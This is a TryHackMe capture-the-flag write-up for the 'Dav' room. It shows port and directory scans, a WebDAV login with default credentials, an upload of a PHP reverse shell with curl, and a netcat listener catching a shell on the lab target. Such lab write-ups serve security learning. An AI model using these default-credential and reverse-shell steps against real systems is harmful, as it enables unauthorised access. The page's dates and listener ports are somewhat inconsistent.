<p align="center">February 25, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I’m genuinely excited to join you on this adventure.<br>
It´s part of my $$\textcolor{#FF69B4}{\textbf{295}}$$-day-streak in  <a href="https://tryhackme.com/r/p/Rosana">TryHackMe</a>.</p>

<h1 align="center">
  $$\textcolor{#3bd62d}{\textnormal{Dav}}$$
</h1>
<p align="center">boot2root machine for FIT and bsides guatemala CTF</p>
<p align="center">Access this 🆓 TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/bsidesgtdav">DAV</a>.</p><br>
<p align="center">
  <img height="150px" src="https://github.com/user-attachments/assets/a4338ad0-fc95-45ab-aec5-5f894685f4ff">
</p>


<h2>Task 1. Dav<a id='1'></a></h2>

<p>Read user.txt and root.txt</p>

<pre><code># root@ip-[Attack]:~# rustscan -a [Target] --ulimit 5000 -- -vvv -sV -sC [Target]
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time \u231b

[~] The config file is expected to be at "/home/rustscan/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open [Target]:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.80 ( https://nmap.org ) at 2024-11-01 01:31 UTC
NSE: Loaded 151 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 01:31
Completed NSE at 01:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 01:31
Completed NSE at 01:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 01:31
Completed NSE at 01:31, 0.00s elapsed
Initiating Ping Scan at 01:31
Scanning 2 hosts [2 ports/host]
Completed Ping Scan at 01:31, 0.00s elapsed (2 total hosts)
Initiating Parallel DNS resolution of 2 hosts. at 01:31
Completed Parallel DNS resolution of 2 hosts. at 01:31, 0.00s elapsed
DNS resolution of 2 IPs took 0.00s. Mode: Async [#: 1, OK: 2, NX: 0, DR: 0, SF: 0, TR: 2, CN: 0]
Initiating Connect Scan at 01:31
Scanning 2 hosts [1 port/host]
Discovered open port 80/tcp on [Target]
Discovered open port 80/tcp on [Target]
Completed Connect Scan at 01:31, 0.00s elapsed (2 total ports)
Initiating Service scan at 01:31
Scanning 2 services on 2 hosts
Completed Service scan at 01:31, 6.04s elapsed (2 services on 2 hosts)
NSE: Script scanning 2 hosts.
NSE: Starting runlevel 1 (of 3) scan.
</code></pre><br>

![image](https://github.com/user-attachments/assets/e88ec0d9-ffdb-4f01-8727-d19ebc90d8bf)

<pre><code># root@ip-[Attack]: dirb http://[Target]

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Nov  1 01:38:01 2024
URL_BASE: http://[Target]/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://[Target]/ ----
+ http://[Target]/index.html (CODE:200|SIZE:11321)                                                               
+ http://[Target]/server-status (CODE:403|SIZE:301)                                                              
+ http://[Target]/webdav (CODE:401|SIZE:460)                                                                     
                                                                                                                      
-----------------
END_TIME: Fri Nov  1 01:38:06 2024
DOWNLOADED: 4612 - FOUND: 3

</code></pre><br>

<p> The default credentials are generally jigsaw:jigsaw(failed) adm1n:p@s$word(failed) wampp:xampp(success).</p>
<br>

![image](https://github.com/user-attachments/assets/76e929c1-d571-46d3-9730-8a09e635915c)

![image](https://github.com/user-attachments/assets/cb7bc450-34ee-466e-be50-bdea7c84cf4c)


![image](https://github.com/user-attachments/assets/e064eb40-ffb6-483f-ac83-7a8c4c61830a)


![image](https://github.com/user-attachments/assets/f884a59b-3b1f-461b-9ece-f1bea833c395)

![image](https://github.com/user-attachments/assets/6db03da3-7c4b-49b0-b7b8-ac684965bdae)

![image](https://github.com/user-attachments/assets/1e396f23-fb41-4b12-88d8-b66776b7eea9)


wampp:$apr1$Wm2VTkFL$PVNRQv7kzqXQIHe14qKA91

![image](https://github.com/user-attachments/assets/daa5c6e3-86f6-438a-8a0a-ed0065dac410)


![image](https://github.com/user-attachments/assets/eca0ec04-bdbb-4574-9399-291b9359f4b5)



<pre><code># root@ip-[Attack]:~# apt install cadaver
</code></pre><br>

<pre><code># root@ip-[Attack]:~# cadaver http://[Target]/webdav/
Authentication required for webdav on server `[Target]':
Username: wampp
Password: 
dav:/webdav/> 
</code></pre><br>

![image](https://github.com/user-attachments/assets/23b64686-dfca-4f6e-a1b5-c96a3b0cd238)


<pre><code># :~# curl -T php-reverse-shell.php -u wampp:xampp  http://10.10.180.121/webdav/
:~# nc -lnvp 1111
Listening on 0.0.0.0 1111
...
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 21:01:05 up  1:13,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 



<br>

![image](https://github.com/user-attachments/assets/475581d3-a920-42d2-9187-8d1bcfe2a6f3)

<br>

<pre><code># root@ip-[Attack]:~# nc -lvnp 2222
Listening on [0.0.0.0] (family 0, port 8080)
</code></pre><br>

<br>

![Fevereiro, 24, 2025,   TryHackMe,  Day 295, DAV, Image -2, install cadaver](https://github.com/user-attachments/assets/0e422828-5d4e-4832-a410-ace00fc04eae)

<br>


![Fevereiro, 24, 2025,   TryHackMe,  Day 295, DAV, Image -1, install cadaver](https://github.com/user-attachments/assets/337ebd44-4420-43d7-9a71-5be15b60b95e)


![Fevereiro, 24, 2025,   TryHackMe,  Day 295, DAV, Image 0, pentestmonkey](https://github.com/user-attachments/assets/b9b939c2-8089-4263-b89e-0c5712803f98)

<br>


![Fevereiro, 24, 2025,   TryHackMe,  Day 295, DAV, Image 1](https://github.com/user-attachments/assets/0cdac5da-e373-4d54-8e7f-8849e35141b0)

<br>

![Fevereiro, 24, 2025,   TryHackMe,  Day 295, DAV, Image 2](https://github.com/user-attachments/assets/029cc126-cf99-44fc-8911-082611cceb6e)

<br>

![Fevereiro, 24, 2025,   TryHackMe,  Day 295, DAV, Image 3](https://github.com/user-attachments/assets/9754fd47-1d0f-47a7-ab7c-19292ffe7610)


<br>


<h2>Room Complete<a id='2'></a></h2>
<p>Keep learning, keep growing!<br>



<h2>My Journey<a id='3'></a></h2>
<p></p>Following I share the status of my journey in TryHackMe.</p>




<p style="text-align: center;">Thank you for coming. Hope to learn together again!!</p>

![Fevereiro, 24, 2025,   TryHackMe,  Day 295, DAV, Room Completed Header and Tasks](https://github.com/user-attachments/assets/1a923028-8e26-467c-b2b3-0cf7e20ebb06)


